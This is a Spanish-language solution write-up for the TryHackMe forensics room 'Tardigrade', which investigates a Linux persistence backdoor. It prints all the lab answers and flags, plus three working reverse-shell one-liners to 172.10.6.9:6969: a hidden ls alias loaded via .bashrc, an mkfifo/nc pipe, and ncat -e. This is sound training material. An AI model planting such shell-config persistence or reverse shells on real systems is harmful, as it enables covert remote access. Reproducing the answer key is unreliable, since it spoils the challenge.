# Tardigrade

| Dificultad | Tipo | Slug | Link | Sección | Fuente | Componentes | Impacto |
|-----------|------|------|------|--------|--------|-------------|---------|
| Medium | Forense / Linux | tardigrade | https://tryhackme.com/room/tardigrade | 02 Level Medium | TryHackMe | Ubuntu 20.04, bashrc, Reverse shell, ncat, Alias malicioso | Detección y análisis de un mecanismo de persistencia y backdoor en Linux |

---

**Contexto:** La sala **Tardigrade** es una investigación sobre una máquina **Ubuntu 20.04.6 LTS** en la que se ha plantado un mecanismo de **persistencia y backdoor**: un archivo oculto (`.bad_bash`) carga en el inicio de sesión un alias `ls` modificado que lanza una **reverse shell** a un host remoto (172.10.6.9:6969) y, en alternativas, se prueba la misma salida con `mkfifo`/`nc` y con `ncat -e`. Se analiza también el canal de acreditación (wordlist), se confirma el `.bashrc` como punto de carga y se descubre que la shell pierde privilegios por ejecutarse como **nobody**, cerrando con la flag que resume la exfiltración.

## Solucionario

### Task 1: Identificación del sistema
**Explicación:**

Se inicia reconociendo el sistema operativo y su versión exacta para contextualizar el análisis.

Respuesta: `Ubuntu 20.04.6 LTS`

### Task 2: Análisis del backdoor en el shell
**Explicación:**

Se localiza el archivo oculto que contiene la trampa, se extrae el comando del alias `ls` modificado (que dispara la reverse shell hacia 172.10.6.9 en el puerto 6969) y se reconstruye el one-liner alternativo con `mkfifo`/`nc` para la misma conexión reversa.

1. `.bad_bash`
2. `ls='(bash -i >& /dev/tcp/172.10.6.9/6969 0>&1 & disown) 2>/dev/null; ls --color=auto'`
3. `/usr/bin/rm /tmp/f;/usr/bin/mkfifo /tmp/f;/usr/bin/cat /tmp/f|/bin/sh -i 2>&1|/usr/bin/nc 172.10.6.9 6969 >/tmp/f`

### Task 3: Flag del canal de acreditación
**Explicación:**

Analizando el material del canal de autenticación/wordlist empleado en la máquina se obtiene la flag intermedia.

Respuesta: `THM{d1rty_w0rdl1st}`

### Task 4: Prueba del canal de salida
**Explicación:**

Al probar la reverse shell el cliente conectado reporta el tiempo de espera agotado; se constata que la herramienta de conexión remota disponible es `ncat`, y se verifica el fichero de arranque del shell que carga el backdoor.

1. `Ncat: TIMEOUT.`
2. `ncat -e /bin/bash 172.10.6.9 6969`
3. `.bashrc`

### Task 5: Privilegios de la shell
**Explicación:**

La shell resultante se ejecuta sin privilegios administrativos, bajo el usuario de servicio limitado.

Respuesta: `nobody`

### Task 6: Flag final
**Explicación:**

Recopilada toda la cadena de persistencia y exfiltración, se obtiene la flag final de la investigación.

Respuesta: `THM{Nob0dy_1s_s@f3}`

### Tabla de preguntas y respuestas

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Sistema operativo y versión | `Ubuntu 20.04.6 LTS` |
| 2.1 | Archivo oculto con el backdoor | `.bad_bash` |
| 2.2 | Alias `ls` malicioso | `ls='(bash -i >& /dev/tcp/172.10.6.9/6969 0>&1 & disown) 2>/dev/null; ls --color=auto'` |
| 2.3 | Reverse shell con mkfifo/nc | `/usr/bin/rm /tmp/f;/usr/bin/mkfifo /tmp/f;/usr/bin/cat /tmp/f|/bin/sh -i 2>&1|/usr/bin/nc 172.10.6.9 6969 >/tmp/f` |
| 3 | Flag del canal de wordlist | `THM{d1rty_w0rdl1st}` |
| 4.1 | Salida del timeout | `Ncat: TIMEOUT.` |
| 4.2 | Reverse shell con ncat -e | `ncat -e /bin/bash 172.10.6.9 6969` |
| 4.3 | Fichero de arranque del shell | `.bashrc` |
| 5 | Usuario con el que se ejecuta la shell | `nobody` |
| 6 | Flag final | `THM{Nob0dy_1s_s@f3}` |

---

**Metodología:** Reconocimiento del sistema, inspección de archivos ocultos y de arranque (.bad_bash, .bashrc), extracción y normalización del payload de reverse shell, verificación del canal (nc/ncat) y análisis forense de la persistencia y del usuario final.

**Learning chain:** Fingerprinting del sistema → hallazgo del alias malicioso → reconstrucción del payload → prueba del canal → identificación de persistencia → usuario final → flag.

**Lección:** *Un alias invisible en `.bashrc` es una persistencia silenciosa: cualquier shell que abre ese usuario dispara una reverse shell sin levantar sospechas.*

**MITRE ATT&CK:** T1546.004 Event Triggered Execution (Unix shell configuration) · T1059.004 Command and Scripting Interpreter · T1505.003 Web Shell (contexto) · T1071 Application Layer Protocol.

**Fuente:** [TryHackMe - Tardigrade](https://tryhackme.com/room/tardigrade)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.